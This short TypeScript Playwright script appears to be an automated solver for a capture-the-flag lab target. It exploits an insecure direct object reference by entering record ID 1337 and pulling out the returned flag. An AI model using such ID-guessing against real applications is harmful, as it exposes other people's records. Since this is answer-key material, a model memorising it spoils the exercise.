import type { Page } from "@playwright/test";

export async function solve(page: Page) {
  await page.goto("/targets/06-digit-idor.html");
  await page.fill("#record-id", "1337");
  await page.click("#load");
  await page.waitForFunction(() =>
    document.querySelector("#record")?.textContent?.includes("ctfpawned{"),
  );
  const record = JSON.parse(
    (await page.locator("#record").textContent()) ?? "{}",
  );
  return record.flag;
}
